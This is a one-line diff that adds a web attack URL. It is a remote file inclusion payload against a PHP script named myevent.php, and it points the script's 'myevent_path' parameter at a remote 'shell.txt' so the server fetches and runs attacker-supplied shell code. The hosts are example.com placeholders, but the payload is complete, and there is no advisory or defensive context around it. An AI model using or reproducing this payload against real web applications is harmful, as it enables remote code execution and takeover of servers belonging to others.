@@ -1,0 +1,1 @@
+http://www.example.com/myevent.php?myevent_path=http://www.example.com/shell.txt?
